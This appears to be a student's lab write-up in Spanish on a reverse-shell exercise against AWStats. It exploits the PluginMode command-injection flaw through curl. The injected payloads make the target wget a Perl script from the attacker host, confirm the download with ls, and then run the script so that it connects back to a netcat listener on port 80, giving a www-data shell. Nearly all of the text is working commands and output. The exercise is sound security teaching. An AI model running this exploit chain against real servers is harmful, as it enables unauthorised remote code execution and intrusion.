# Práctica 1 - Shell Reversa

Lo primero es en una terminal abrir un server de HTTP, esto se puede hacer con python3, la idea es abrirlo donde se tiene el `scrpit.pl` :
```
sudo python3 -m http.server 80 --bind 10.0.3.4
```

y ves que se ejecuta proque aparece:
```
Serving HTTP on 10.0.3.4 port 80 (http://10.0.3.4/) ...
```

Ahora, utilizamos el exploit de `awstats`, este consiste en que, si nosotros hacemos un curl, podemos forzar a que la maquina servidor ejecute un comando de shell:

```
curl --noproxy "*" --get \
  --data-urlencode "PluginMode=:print system('wget --no-proxy http://10.0.3.4/script.pl -O /tmp/script.pl') ;" \
  "http://10.0.3.5/awstats/awstats.pl"
```

Esto es posible porque AWStats tiene una vulnerabilidad que permite la inyección de comandos. Entonces, el programa toma lo que le eniamos y lo ejecuta como si fuera código Perl. en el comando anterior:

```
system('wget --no-proxy http://10.0.3.4/script.pl -O /tmp/script.pl');
```

lo que hacemos es darle la orden al servidor de que ejecute wget para que descargue nuestro archivo script.pl desde atacante (10.0.3.4).

Cuando ejecutamos el exploit, el servidor nos devuelve una página HTML. Dentro del <body> de esa pagina aparece un 0. Ese 0 es el codigo de retorno que devuelve la funcion system() de perl, e indica que el comando wget se ejecuto sin errores.

Como detalle, esta llamada no es un simple comando de shell, sino que AWStats recibe ese texto y lo interpreta directamente como codigo perl. Por eso usamos system(), que es una función propia de perl para ejecutar comandos del sistema operativo.

Entonces al ejecutar lo antirior, podemos observar que, en la primera terminal que tenia el server, aparece la peticion de GET:

```
Serving HTTP on 10.0.3.4 port 80 (http://10.0.3.4/) ...
10.0.3.5 - - [06/Jun/2026 18:40:24] "GET /script.pl HTTP/1.1" 200 -
```

y ahora, podemos tambien con el mismo exploit, revisar si el archivo esta en el server:

```
curl --noproxy "*" --get \
  --data-urlencode "PluginMode=:print system('ls -l /tmp/script.pl') ;" \
  "http://10.0.3.5/awstats/awstats.pl"
```
y podemos ver la respuesta que recibimos en formato html:
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html lang='en'>
<head>
.
.
.
<body style="margin-top: 0px">
-rw-r--r-- 1 www-data www-data 355 Jun  6 18:32 /tmp/script.pl
0<br /><br />
.
.
.
</html>
```

en una terminal aparte usamos netcat, en el puerto 80 (cerramos el servidor anterior de http) y ejecutamos:

```
sudo nc -lvnp 80
```

que nos aparecera
```
Listening on 0.0.0.0 80
```

y luego una vez que el server tiene el script podemos hacer que lo ejecute con el comando "perl /tmp/script.pl 10.0.3.4" como venimaos hacinedo:

```
curl --noproxy "*" --get \
  --data-urlencode "PluginMode=:print system('perl /tmp/script.pl 10.0.3.4') ;" \
  "http://10.0.3.5/awstats/awstats.pl"
```

ahi, podemos observar en la terminal de netcat que, se realizo una conexion, y pueod ingresar comandos, que lo que recibo es la respuesta del mismo desde el server, es decir una shell reversa: 

```
Connection received on 10.0.3.5 56702
Acceso desde equipo remoto
whoami
www-data

ls
awredir.pl
awstats.model.conf
awstats.pl
lang
lib
plugins
```


Es decir se obtuvo una shell reversa en la máquina víctima (10.0.3.5) desde la máquina atacante (10.0.3.4), demostrando que las políticas de firewall que permiten conexiones salientes al puerto 80 pueden ser explotadas.